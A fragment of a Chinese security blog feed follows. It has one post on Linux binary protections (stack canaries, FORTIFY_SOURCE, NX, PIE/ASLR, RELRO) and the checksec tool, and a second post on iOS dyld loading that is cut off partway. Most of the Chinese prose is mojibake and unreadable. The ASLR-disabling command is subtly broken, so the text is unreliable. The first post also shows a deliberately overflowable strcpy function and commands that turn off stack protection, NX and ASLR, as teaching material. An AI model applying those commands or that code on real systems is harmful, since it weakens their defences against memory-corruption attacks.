    <url>/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<p>ä»Šå¤©åœ¨ç ”ç©¶liunxä¸‹æ ˆæº¢å‡ºçš„æ—¶å€™å‘ç°è‡ªå·±å¯¹å„ç§ä¿æŠ¤æœºåˆ¶å¹¶ä¸æ˜¯ç‰¹åˆ«äº†è§£ï¼Œå› æ­¤å°±è¿™æ–¹é¢çš„çŸ¥è¯†åœ¨ç½‘ä¸ŠæŸ¥æ‰¾äº†ä¸€äº›èµ„æ–™å¹¶æ€»ç»“äº†ä¸€äº›å¿ƒå¾—å’Œå¤§å®¶åˆ†äº«ã€‚<br><a id="more"></a><br>æ“ä½œç³»ç»Ÿæä¾›äº†è®¸å¤šå®‰å…¨æœºåˆ¶æ¥å°è¯•é™ä½æˆ–é˜»æ­¢ç¼“å†²åŒºæº¢å‡ºæ”»å‡»å¸¦æ¥çš„å®‰å…¨é£é™©ï¼ŒåŒ…æ‹¬DEPã€ASLRç­‰ã€‚åœ¨ç¼–å†™æ¼æ´åˆ©ç”¨ä»£ç çš„æ—¶å€™ï¼Œéœ€è¦ç‰¹åˆ«æ³¨æ„ç›®æ ‡è¿›ç¨‹æ˜¯å¦å¼€å¯äº†DEPï¼ˆLinuxä¸‹å¯¹åº”NXï¼‰ã€ASLRï¼ˆLinuxä¸‹å¯¹åº”PIEï¼‰ç­‰æœºåˆ¶ï¼Œä¾‹å¦‚å­˜åœ¨DEPï¼ˆNXï¼‰çš„è¯å°±ä¸èƒ½ç›´æ¥æ‰§è¡Œæ ˆä¸Šçš„æ•°æ®ï¼Œå­˜åœ¨ASLRçš„è¯å„ä¸ªç³»ç»Ÿè°ƒç”¨çš„åœ°å€å°±æ˜¯éšæœºåŒ–çš„ã€‚</p>
<h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><p>checksecæ˜¯ä¸€ä¸ªè„šæœ¬è½¯ä»¶ï¼Œä¹Ÿå°±æ˜¯ç”¨è„šæœ¬å†™çš„ä¸€ä¸ªæ–‡ä»¶ï¼Œä¸åˆ°2000è¡Œï¼Œå¯ç”¨æ¥å­¦ä¹ shellã€‚ </p>
<p>æºç å‚è§ </p>
<p><a href="http://www.trapkit.de/tools/checksec.html" target="_blank" rel="external">http://www.trapkit.de/tools/checksec.html</a></p>
<p><a href="https://github.com/slimm609/checksec.sh/" target="_blank" rel="external">https://github.com/slimm609/checksec.sh/</a></p>
<p>ä¸‹è½½æ–¹æ³•ä¹‹ä¸€ä¸º </p>
<p>wget <a href="https://github.com/slimm609/checksec.sh/archive/1.6.tar.gz" target="_blank" rel="external">https://github.com/slimm609/checksec.sh/archive/1.6.tar.gz</a></p>
<p>checksecåˆ°åº•æ˜¯ç”¨æ¥å¹²ä»€ä¹ˆçš„ï¼Ÿ </p>
<p>å®ƒæ˜¯ç”¨æ¥æ£€æŸ¥å¯æ‰§è¡Œæ–‡ä»¶å±æ€§ï¼Œä¾‹å¦‚PIE, RELRO, PaX, Canaries, ASLR, Fortify Sourceç­‰ç­‰å±æ€§ã€‚</p>
<p>checksecçš„ä½¿ç”¨æ–¹æ³•ï¼š<br><img src="http://img.blog.csdn.net/20160920223340302" alt=""></p>
<p>checksec â€“file /usr/sbin/sshd<br><img src="http://img.blog.csdn.net/20160920235408000" alt=""></p>
<p>ä¸€èˆ¬æ¥è¯´ï¼Œå¦‚æœæ˜¯å­¦ä¹ äºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨çš„æœ‹å‹ï¼Œå»ºè®®å¤§å®¶ä½¿ç”¨gdbé‡Œpedaæ’ä»¶é‡Œè‡ªå¸¦çš„checksecåŠŸèƒ½ï¼Œå¦‚ä¸‹ï¼š</p>
<pre><code>gdb-peda$ checksec start
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : disabled
</code></pre><p>ä¸‹é¢æˆ‘ä»¬å°±å›¾ä¸­å„ä¸ªä¿æŠ¤æœºåˆ¶è¿›è¡Œä¸€ä¸ªå¤§è‡´çš„äº†è§£ã€‚</p>
<h2 id="CANNARY-æ ˆä¿æŠ¤"><a href="#CANNARY-æ ˆä¿æŠ¤" class="headerlink" title="CANNARY(æ ˆä¿æŠ¤)"></a>CANNARY(æ ˆä¿æŠ¤)</h2><p>è¿™ä¸ªé€‰é¡¹è¡¨ç¤ºæ ˆä¿æŠ¤åŠŸèƒ½æœ‰æ²¡æœ‰å¼€å¯ã€‚</p>
<p>æ ˆæº¢å‡ºä¿æŠ¤æ˜¯ä¸€ç§ç¼“å†²åŒºæº¢å‡ºæ”»å‡»ç¼“è§£æ‰‹æ®µï¼Œå½“å‡½æ•°å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ”»å‡»æ¼æ´æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥è¦†ç›–æ ˆä¸Šçš„è¿”å›åœ°å€æ¥è®©shellcodeèƒ½å¤Ÿå¾—åˆ°æ‰§è¡Œã€‚å½“å¯ç”¨æ ˆä¿æŠ¤åï¼Œå‡½æ•°å¼€å§‹æ‰§è¡Œçš„æ—¶å€™ä¼šå…ˆå¾€æ ˆé‡Œæ’å…¥cookieä¿¡æ¯ï¼Œå½“å‡½æ•°çœŸæ­£è¿”å›çš„æ—¶å€™ä¼šéªŒè¯cookieä¿¡æ¯æ˜¯å¦åˆæ³•ï¼Œå¦‚æœä¸åˆæ³•å°±åœæ­¢ç¨‹åºè¿è¡Œã€‚æ”»å‡»è€…åœ¨è¦†ç›–è¿”å›åœ°å€çš„æ—¶å€™å¾€å¾€ä¹Ÿä¼šå°†cookieä¿¡æ¯ç»™è¦†ç›–æ‰ï¼Œå¯¼è‡´æ ˆä¿æŠ¤æ£€æŸ¥å¤±è´¥è€Œé˜»æ­¢shellcodeçš„æ‰§è¡Œã€‚åœ¨Linuxä¸­æˆ‘ä»¬å°†cookieä¿¡æ¯ç§°ä¸ºcanaryã€‚</p>
<p>gccåœ¨4.2ç‰ˆæœ¬ä¸­æ·»åŠ äº†-fstack-protectorå’Œ-fstack-protector-allç¼–è¯‘å‚æ•°ä»¥æ”¯æŒæ ˆä¿æŠ¤åŠŸèƒ½ï¼Œ4.9æ–°å¢äº†-fstack-protector-strongç¼–è¯‘å‚æ•°è®©ä¿æŠ¤çš„èŒƒå›´æ›´å¹¿ã€‚</p>
<p>å› æ­¤åœ¨ç¼–è¯‘æ—¶å¯ä»¥æ§åˆ¶æ˜¯å¦å¼€å¯æ ˆä¿æŠ¤ä»¥åŠç¨‹åº¦ï¼Œä¾‹å¦‚ï¼š</p>
<pre><code>gcc -fno-stack-protector -o test test.c  //ç¦ç”¨æ ˆä¿æŠ¤
gcc -fstack-protector -o test test.c   //å¯ç”¨å †æ ˆä¿æŠ¤ï¼Œä¸è¿‡åªä¸ºå±€éƒ¨å˜é‡ä¸­å«æœ‰ char æ•°ç»„çš„å‡½æ•°æ’å…¥ä¿æŠ¤ä»£ç 
gcc -fstack-protector-all -o test test.c //å¯ç”¨å †æ ˆä¿æŠ¤ï¼Œä¸ºæ‰€æœ‰å‡½æ•°æ’å…¥ä¿æŠ¤ä»£ç 
</code></pre><h2 id="FORTIFY"><a href="#FORTIFY" class="headerlink" title="FORTIFY"></a>FORTIFY</h2><p>è¿™ä¸ªä¿æŠ¤æœºåˆ¶æŸ¥äº†å¾ˆä¹…éƒ½æ²¡æœ‰ä¸ªå¾ˆå¥½çš„æ±‰è¯­å½¢å®¹ï¼Œæ ¹æ®æˆ‘çš„ç†è§£å®ƒå…¶å®å’Œæ ˆä¿æŠ¤éƒ½æ˜¯gccçš„æ–°çš„ä¸ºäº†å¢å¼ºä¿æŠ¤çš„ä¸€ç§æœºåˆ¶ï¼Œé˜²æ­¢ç¼“å†²åŒºæº¢å‡ºæ”»å‡»ã€‚ç”±äºå¹¶ä¸æ˜¯å¤ªå¸¸è§ï¼Œä¹Ÿæ²¡æœ‰å¤ªå¤šçš„äº†è§£ã€‚</p>
<p>ä¸¾ä¸ªä¾‹å­å¯èƒ½ç®€å•æ˜äº†ä¸€äº›ï¼š<br>ä¸€æ®µç®€å•çš„å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºçš„Cä»£ç </p>
<pre><code>void fun(char *s) {
        char buf[0x100];
        strcpy(buf, s);
        /* Don&apos;t allow gcc to optimise away the buf */
        asm volatile(&quot;&quot; :: &quot;m&quot; (buf));
}
</code></pre><p>ç”¨åŒ…å«å‚æ•°-U_FORTIFY_SOURCEç¼–è¯‘</p>
<pre><code>08048450 &lt;fun&gt;:
  push   %ebp               ; 
  mov    %esp,%ebp

  sub    $0x118,%esp        ; å°†0x118å­˜å‚¨åˆ°æ ˆä¸Š
  mov    0x8(%ebp),%eax     ; å°†ç›®æ ‡å‚æ•°è½½å…¥eax
  mov    %eax,0x4(%esp)     ; ä¿å­˜ç›®æ ‡å‚æ•°
  lea    -0x108(%ebp),%eax  ; æ•°ç»„buf
  mov    %eax,(%esp)        ; ä¿å­˜
  call   8048320 &lt;strcpy@plt&gt;

  leave                     ; 
  ret
</code></pre><p>ç”¨åŒ…å«å‚æ•°-D_FORTIFY_SOURCE=2ç¼–è¯‘</p>
<pre><code>08048470 &lt;fun&gt;:
  push   %ebp               ; 
  mov    %esp,%ebp

  sub    $0x118,%esp        ; 
  movl   $0x100,0x8(%esp)   ; æŠŠ0x100å½“ä½œç›®æ ‡å‚æ•°ä¿å­˜
  mov    0x8(%ebp),%eax     ; 
  mov    %eax,0x4(%esp)     ; 
  lea    -0x108(%ebp),%eax  ; 
  mov    %eax,(%esp)        ; 
  call   8048370 &lt;__strcpy_chk@plt&gt;

  leave                      ; 
  ret
</code></pre><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°gccç”Ÿæˆäº†ä¸€äº›é™„åŠ ä»£ç ï¼Œé€šè¿‡å¯¹æ•°ç»„å¤§å°çš„åˆ¤æ–­æ›¿æ¢strcpy, memcpy, memsetç­‰å‡½æ•°åï¼Œè¾¾åˆ°é˜²æ­¢ç¼“å†²åŒºæº¢å‡ºçš„ä½œç”¨ã€‚</p>
<h2 id="NXï¼ˆDEPï¼‰"><a href="#NXï¼ˆDEPï¼‰" class="headerlink" title="NXï¼ˆDEPï¼‰"></a>NXï¼ˆDEPï¼‰</h2><p>NXå³No-eXecuteï¼ˆä¸å¯æ‰§è¡Œï¼‰çš„æ„æ€ï¼ŒNXï¼ˆDEPï¼‰çš„åŸºæœ¬åŸç†æ˜¯å°†æ•°æ®æ‰€åœ¨å†…å­˜é¡µæ ‡è¯†ä¸ºä¸å¯æ‰§è¡Œï¼Œå½“ç¨‹åºæº¢å‡ºæˆåŠŸè½¬å…¥shellcodeæ—¶ï¼Œç¨‹åºä¼šå°è¯•åœ¨æ•°æ®é¡µé¢ä¸Šæ‰§è¡ŒæŒ‡ä»¤ï¼Œæ­¤æ—¶CPUå°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè€Œä¸æ˜¯å»æ‰§è¡Œæ¶æ„æŒ‡ä»¤ã€‚</p>
<p>å·¥ä½œåŸç†å¦‚å›¾ï¼š<br><img src="http://space.itpub.net/attachments/2011/07/13164110_201107181702402.jpg?_=2109736" alt=""><br>gccç¼–è¯‘å™¨é»˜è®¤å¼€å¯äº†NXé€‰é¡¹ï¼Œå¦‚æœéœ€è¦å…³é—­NXé€‰é¡¹ï¼Œå¯ä»¥ç»™gccç¼–è¯‘å™¨æ·»åŠ -z execstackå‚æ•°ã€‚<br>ä¾‹å¦‚ï¼š</p>
<pre><code>gcc -z execstack -o test test.c
</code></pre><p>åœ¨Windowsä¸‹ï¼Œç±»ä¼¼çš„æ¦‚å¿µä¸ºDEPï¼ˆæ•°æ®æ‰§è¡Œä¿æŠ¤ï¼‰ï¼Œåœ¨æœ€æ–°ç‰ˆçš„Visual Studioä¸­é»˜è®¤å¼€å¯äº†DEPç¼–è¯‘é€‰é¡¹ã€‚</p>
<h2 id="PIEï¼ˆASLRï¼‰"><a href="#PIEï¼ˆASLRï¼‰" class="headerlink" title="PIEï¼ˆASLRï¼‰"></a>PIEï¼ˆASLRï¼‰</h2><p>ä¸€èˆ¬æƒ…å†µä¸‹NXï¼ˆWindowså¹³å°ä¸Šç§°å…¶ä¸ºDEPï¼‰å’Œåœ°å€ç©ºé—´åˆ†å¸ƒéšæœºåŒ–ï¼ˆASLRï¼‰ä¼šåŒæ—¶å·¥ä½œã€‚</p>
<p>å†…å­˜åœ°å€éšæœºåŒ–æœºåˆ¶ï¼ˆaddress space layout randomization)ï¼Œæœ‰ä»¥ä¸‹ä¸‰ç§æƒ…å†µ</p>
<pre><code>0 - è¡¨ç¤ºå…³é—­è¿›ç¨‹åœ°å€ç©ºé—´éšæœºåŒ–ã€‚
1 - è¡¨ç¤ºå°†mmapçš„åŸºå€ï¼Œstackå’Œvdsoé¡µé¢éšæœºåŒ–ã€‚
2 - è¡¨ç¤ºåœ¨1çš„åŸºç¡€ä¸Šå¢åŠ æ ˆï¼ˆheapï¼‰çš„éšæœºåŒ–ã€‚
</code></pre><p>å¯ä»¥é˜²èŒƒåŸºäºRet2libcæ–¹å¼çš„é’ˆå¯¹DEPçš„æ”»å‡»ã€‚ASLRå’ŒDEPé…åˆä½¿ç”¨ï¼Œèƒ½æœ‰æ•ˆé˜»æ­¢æ”»å‡»è€…åœ¨å †æ ˆä¸Šè¿è¡Œæ¶æ„ä»£ç ã€‚</p>
<p>Built as PIEï¼šä½ç½®ç‹¬ç«‹çš„å¯æ‰§è¡ŒåŒºåŸŸï¼ˆposition-independent executablesï¼‰ã€‚è¿™æ ·ä½¿å¾—åœ¨åˆ©ç”¨ç¼“å†²æº¢å‡ºå’Œç§»åŠ¨æ“ä½œç³»ç»Ÿä¸­å­˜åœ¨çš„å…¶ä»–å†…å­˜å´©æºƒç¼ºé™·æ—¶é‡‡ç”¨é¢å‘è¿”å›çš„ç¼–ç¨‹ï¼ˆreturn-oriented programmingï¼‰æ–¹æ³•å˜å¾—éš¾å¾—å¤šã€‚</p>
<p>liunxä¸‹å…³é—­PIEçš„å‘½ä»¤å¦‚ä¸‹ï¼š</p>
<pre><code>sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space
</code></pre><h2 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h2><p>è®¾ç½®ç¬¦å·é‡å®šå‘è¡¨æ ¼ä¸ºåªè¯»æˆ–åœ¨ç¨‹åºå¯åŠ¨æ—¶å°±è§£æå¹¶ç»‘å®šæ‰€æœ‰åŠ¨æ€ç¬¦å·ï¼Œä»è€Œå‡å°‘å¯¹GOTï¼ˆGlobal Offset Tableï¼‰æ”»å‡»ã€‚</p>
]]></content>
      <tags>
        <tag>liunx</tag>
      </tags>
  </entry>
  <entry>
    <title>dyldçš„é‚£äº›äº‹</title>
    <url>/2020/12/30/dyld%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/</url>
    <content><![CDATA[<p>å‰å‡ å¤©å­¦ä¹ äº†MachOæ–‡ä»¶çš„åŸºæœ¬ç»“æ„ï¼Œç®€å•äº†è§£äº†MathOçš„å·¥ä½œåŸç†ï¼Œä½†æ˜¯é‡Œé¢ç»å¸¸ä¼šæ¶‰åŠåˆ°dyldåŠ è½½å™¨ï¼Œæœ¬ç¯‡ä¸»è¦å­¦ä¹ dyldåŠ è½½åº”ç”¨ç¨‹åºä¸­çš„é‚£äº›äº‹ã€‚<br><a id="more"></a></p>
<h1 id="dyld"><a href="#dyld" class="headerlink" title="dyld"></a>dyld</h1><p>æ¯ä¸ªç¨‹åºæˆ‘ä»¬çœ‹åˆ°çš„å…¥å£å‡½æ•°éƒ½æ˜¯mainå‡½æ•°ï¼Œä½†æ˜¯ç¨‹åºå¹¶ä¸æ˜¯ä»è¯¥å‡½æ•°å¼€å§‹æ‰§è¡Œçš„ï¼Œåœ¨æ‰§è¡Œmianå‡½æ•°ä¹‹å‰å°±å·²ç»æ‰§è¡Œäº†+loadå’Œconstructoræ„é€ å‡½æ•°ï¼Œé¦–å…ˆçœ‹çœ‹mainå‡½æ•°åœ¨æ‰§è¡Œä¹‹å‰éƒ½å‘ç”Ÿäº†ä»€ä¹ˆã€‚</p>
<h2 id="dyldç®€ä»‹"><a href="#dyldç®€ä»‹" class="headerlink" title="dyldç®€ä»‹"></a>dyldç®€ä»‹</h2><p>ç¨‹åºåœ¨è¿è¡Œæ—¶ä¼šä¾èµ–å¾ˆå¤šç³»ç»ŸåŠ¨æ€åº“ï¼Œç³»ç»ŸåŠ¨æ€åº“ä¼šé€šè¿‡åŠ¨æ€åº“åŠ è½½å™¨dyldåŠ è½½åˆ°å†…å­˜ä¸­ï¼Œåœ¨æ“ä½œç³»ç»Ÿå†…æ ¸åšå¥½ç¨‹åºçš„å‡†å¤‡å·¥ä½œä¹‹åï¼Œåç»­å·¥ä½œå°±äº¤ç»™dyldã€‚</p>
<h2 id="dyldåŠ è½½æµç¨‹"><a href="#dyldåŠ è½½æµç¨‹" class="headerlink" title="dyldåŠ è½½æµç¨‹"></a>dyldåŠ è½½æµç¨‹</h2><p>é¦–å…ˆç¼–å†™ä¸€ä¸ªdemoï¼Œå®šä¹‰ä¸€ä¸ª+ loadå‡½æ•°ï¼Œä¸‹æ–­ç‚¹ï¼ŒåŒæ—¶åœ¨mainå‡½æ•°ä¸‹æ–­ç‚¹ï¼Œè¿è¡Œå‘ç°ç¡®å®æ˜¯åœ¨mainå‡½æ•°ä¹‹å‰æ–­ä¸‹çš„ï¼Œæ¥ç€æ¥ç ”ç©¶ä¸€ä¸‹ï¼ŒåŠ è½½mainå‡½æ•°ä¹‹å‰éƒ½å¹²å•¥äº†ã€‚</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/dyld1.jpg" alt=""></p>
<h3 id="dyldbootstrap-start"><a href="#dyldbootstrap-start" class="headerlink" title="dyldbootstrap::start"></a>dyldbootstrap::start</h3><p>ç³»ç»Ÿå¯åŠ¨åº”ç”¨çš„å…¥å£æ˜¯_dyld_startï¼Œé¦–å…ˆdyldä¼šè°ƒç”¨dyldbootstrap::startï¼Œè¯¥æ–¹æ³•ä¼šè¿”å›mainå‡½æ•°æŒ‡é’ˆï¼Œçœ‹ä¸€ä¸‹dyldbootstrapçš„startåšäº†ä»€ä¹ˆã€‚</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="comment">//  This is code to bootstrap dyld.  This work in normally done for a program by dyld and crt.</span></div><div class="line"><span class="comment">//  In dyld we have to do this manually.</span></div><div class="line"><span class="comment">//</span></div><div class="line"><span class="keyword">uintptr_t</span> start(<span class="keyword">const</span> <span class="keyword">struct</span> macho_header* appsMachHeader, <span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[], </div><div class="line">                <span class="keyword">intptr_t</span> slide, <span class="keyword">const</span> <span class="keyword">struct</span> macho_header* dyldsMachHeader,</div><div class="line">                <span class="keyword">uintptr_t</span>* startGlue)</div><div class="line">&#123;</div><div class="line">    <span class="comment">// if kernel had to slide dyld, we need to fix up load sensitive locations</span></div><div class="line">    <span class="comment">// we have to do this before using any global variables</span></div><div class="line">    <span class="comment">// æ»‘å—ï¼ŒASLRæŠ€æœ¯ï¼Œåœ°å€åç§»ï¼Œæ˜¯MachOæ–‡ä»¶åœ¨å†…å­˜ä¸­çš„åœ°å€é‡å®šå‘</span></div><div class="line">    slide = slideOfMainExecutable(dyldsMachHeader);</div><div class="line">    <span class="keyword">bool</span> shouldRebase = slide != <span class="number">0</span>;</div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> __has_feature(ptrauth_calls)</span></div><div class="line">    shouldRebase = <span class="literal">true</span>;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line">    <span class="keyword">if</span> ( shouldRebase ) &#123;</div><div class="line">        <span class="comment">// é‡å®šå‘</span></div><div class="line">        rebaseDyld(dyldsMachHeader, slide);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// allow dyld to use mach messaging</span></div><div class="line">    <span class="comment">// æ¶ˆæ¯åˆå§‹åŒ–</span></div><div class="line">    mach_init();</div><div class="line"></div><div class="line">    <span class="comment">// kernel sets up env pointer to be just past end of agv array</span></div><div class="line">    <span class="keyword">const</span> <span class="keyword">char</span>** envp = &amp;argv[argc+<span class="number">1</span>];</div><div class="line">    </div><div class="line">    <span class="comment">// kernel sets up apple pointer to be just past end of envp array</span></div><div class="line">    <span class="keyword">const</span> <span class="keyword">char</span>** apple = envp;</div><div class="line">    <span class="keyword">while</span>(*apple != <span class="literal">NULL</span>) &#123; ++apple; &#125;</div><div class="line">    ++apple;</div><div class="line"></div><div class="line">    <span class="comment">// set up random value for stack canary</span></div><div class="line">    <span class="comment">// æ ˆæº¢å‡ºä¿æŠ¤</span></div><div class="line">    <span class="number">__</span>guard_setup(apple);</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> DYLD_INITIALIZER_SUPPORT</span></div><div class="line">    <span class="comment">// run all C++ initializers inside dyld</span></div><div class="line">    runDyldInitializers(dyldsMachHeader, slide, argc, argv, envp, apple);</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"></div><div class="line">    <span class="comment">// now that we are done bootstrapping dyld, call dyld's main</span></div><div class="line">    <span class="comment">// æ­£åœ¨çš„å¯åŠ¨å‡½æ•°ï¼Œåœ¨dyldä¸­çš„_mainå‡½æ•°ä¸­</span></div><div class="line">    <span class="keyword">uintptr_t</span> appsSlide = slideOfMainExecutable(appsMachHeader);</div><div class="line">    <span class="keyword">return</span> dyld::<span class="number">_</span>main(appsMachHeader, appsSlide, argc, argv, envp, apple, startGlue);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>ä»startå‡½æ•°çš„æºç å¯çŸ¥ï¼šdlydä¼šå†…å­˜ä¸­æ‰¾åˆ°ä¸€å—åœ°å€ç»™MachOä½¿ç”¨ï¼Œä¹Ÿå°±æ˜¯ASLRï¼Œå†…å­˜åç§»ã€‚<br>æœ€åstartå‡½æ•°è°ƒç”¨äº†dyld::_mainå¹¶è¿”å›ç¨‹åºmainå‡½æ•°çš„æŒ‡é’ˆã€‚</p>
<h3 id="dyld-main"><a href="#dyld-main" class="headerlink" title="dyld::_main"></a>dyld::_main</h3><p>mainå‡½æ•°å¾ˆå¤šï¼Œè¿™é‡Œåªåˆ†æäº†ä¸€äº›å…³é”®çš„ä»£ç </p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/dyld2.jpg" alt=""></p>
<h4 id="é…ç½®ç¯å¢ƒå˜é‡"><a href="#é…ç½®ç¯å¢ƒå˜é‡" class="headerlink" title="é…ç½®ç¯å¢ƒå˜é‡"></a>é…ç½®ç¯å¢ƒå˜é‡</h4><p>ä»mainå‡½æ•°çš„åˆå§‹ï¼Œåˆ°å‡½æ•°getHostInfo()ä¹‹å‰éƒ½æ˜¯åœ¨é…ç½®ä¸€äº›ç¯å¢ƒå˜é‡ï¼Œè´´å‡ºéƒ¨åˆ†ä»£ç åŠŸèƒ½ã€‚</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/dyld3.jpg" alt=""></p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/dyld4.jpg" alt=""></p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/dyld5.jpg" alt=""></p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/dyld6.jpg" alt=""></p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/dyld7.jpg" alt=""></p>
<h4 id="åŠ è½½å…±äº«ç¼“å­˜"><a href="#åŠ è½½å…±äº«ç¼“å­˜" class="headerlink" title="åŠ è½½å…±äº«ç¼“å­˜"></a>åŠ è½½å…±äº«ç¼“å­˜</h4><p>åœ¨iOSç³»ç»Ÿä¸­ï¼Œæ¯ä¸ªç¨‹åºä¾èµ–çš„åŠ¨æ€åº“éƒ½éœ€è¦é€šè¿‡dyldï¼ˆä½äº/usr/lib/dyldï¼‰ä¸€ä¸ªä¸€ä¸ªåŠ è½½åˆ°å†…å­˜ï¼Œç„¶è€Œå¦‚æœåœ¨æ¯ä¸ªç¨‹åºè¿è¡Œçš„æ—¶å€™éƒ½é‡å¤çš„å»åŠ è½½ä¸€æ¬¡ï¼ŒåŠ¿å¿…é€ æˆè¿è¡Œç¼“æ…¢ï¼Œä¸ºäº†ä¼˜åŒ–å¯åŠ¨é€Ÿåº¦å’Œæé«˜ç¨‹åºæ€§èƒ½ï¼Œå…±äº«ç¼“å­˜æœºåˆ¶å°±åº”è¿è€Œç”Ÿã€‚æ‰€æœ‰é»˜è®¤çš„åŠ¨æ€é“¾æ¥åº“è¢«åˆå¹¶æˆä¸€ä¸ªå¤§çš„ç¼“å­˜æ–‡ä»¶ï¼Œæ”¾åˆ°/System/Library/Caches/com.apple.dyld/ç›®å½•ä¸‹ï¼ŒæŒ‰ä¸åŒçš„æ¶æ„ä¿å­˜åˆ†åˆ«ä¿å­˜ç€ã€‚å…¶ä¸­åŒ…æ‹¬UIKitï¼ŒFoundationç­‰åŸºç¡€åº“ã€‚</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/dyld8.jpg" alt=""></p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/dyld9.jpg" alt=""></p>
<h4 id="å®ä¾‹åŒ–ä¸»ç¨‹åº"><a href="#å®ä¾‹åŒ–ä¸»ç¨‹åº" class="headerlink" title="å®ä¾‹åŒ–ä¸»ç¨‹åº"></a>å®ä¾‹åŒ–ä¸»ç¨‹åº</h4><p>ä¸»ç¨‹åºçš„å®ä¾‹åŒ–ä¸»è¦æ˜¯å°†MachOæ–‡ä»¶ä¸­LoadCommonsæ®µå†…ä¿¡æ¯æ”¾å…¥å†…å­˜ä¸­ã€‚</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/dyld10.jpg" alt=""></p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/dyld11.jpg" alt=""></p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/dyld12.jpg" alt=""></p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/dyld13.jpg" alt=""></p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/dyld14.jpg" alt=""></p>
<h4 id="åŠ è½½åŠ¨æ€é“¾æ¥åº“"><a href="#åŠ è½½åŠ¨æ€é“¾æ¥åº“" class="headerlink" title="åŠ è½½åŠ¨æ€é“¾æ¥åº“"></a>åŠ è½½åŠ¨æ€é“¾æ¥åº“</h4><p>åŠ è½½å¤–éƒ¨çš„åŠ¨æ€é“¾æ¥åº“ï¼Œæ³¨å…¥æ¶‰åŠåˆ°çš„åº“ä¹Ÿæ˜¯é€šè¿‡è¿™ç§æ–¹å¼æ·»åŠ ã€‚</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/dyld15.jpg" alt=""></p>
<h4 id="é“¾æ¥ä¸»ç¨‹åº"><a href="#é“¾æ¥ä¸»ç¨‹åº" class="headerlink" title="é“¾æ¥ä¸»ç¨‹åº"></a>é“¾æ¥ä¸»ç¨‹åº</h4><p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/dyld16.jpg" alt=""></p>
<h4 id="é“¾æ¥å…¶ä»–åŠ¨æ€é“¾æ¥åº“"><a href="#é“¾æ¥å…¶ä»–åŠ¨æ€é“¾æ¥åº“" class="headerlink" title="é“¾æ¥å…¶ä»–åŠ¨æ€é“¾æ¥åº“"></a>é“¾æ¥å…¶ä»–åŠ¨æ€é“¾æ¥åº“</h4><p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/dyld17.jpg" alt=""></p>
<h4 id="åŠ è½½loadæ–¹æ³•-amp-å¯»æ‰¾mainå‡½æ•°"><a href="#åŠ è½½loadæ–¹æ³•-amp-å¯»æ‰¾mainå‡½æ•°" class="headerlink" title="åŠ è½½loadæ–¹æ³•&amp;å¯»æ‰¾mainå‡½æ•°"></a>åŠ è½½loadæ–¹æ³•&amp;å¯»æ‰¾mainå‡½æ•°</h4><p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/dyld18.jpg" alt=""></p>
<p>ä»åŠ è½½loadæ–¹æ³•åˆ°mainå‡½æ•°ä¸­é—´è¿™ä¸ªè¿‡ç¨‹ç›¸å¯¹æ¯”è¾ƒé‡è¦ï¼Œç”±äºå†ä¸‰è¿˜æ˜¯èŠ±ä¸€äº›åŠŸå¤«å»ç ”ç©¶ä¸€ä¸‹ï¼Œè·³è¿‡è¿™ä¸ªå¤æ‚çš„è¿‡ç¨‹æ€»è§‰å¾—è¿™æ³¢ç™½æäº†ï¼Œé‚£ä¹ˆç»§ç»­æã€‚</p>
<ul>
<li>é¦–å…ˆè¿›å…¥initializeMainExecutableæºç ,ä¸»è¦æ˜¯å¾ªç¯éå†ï¼Œéƒ½ä¼šæ‰§è¡ŒrunInitializersæ–¹æ³•</li>
</ul>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/dyld19.jpg" alt=""></p>
<ul>
<li>è¿›å…¥runInitializersæ–¹æ³•ï¼Œè¿™ä¸ªé˜²æŠ¤æ ¸å¿ƒæ˜¯processInitializerså‡½æ•°çš„è°ƒç”¨</li>
</ul>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/dyld20.jpg" alt=""></p>
<ul>
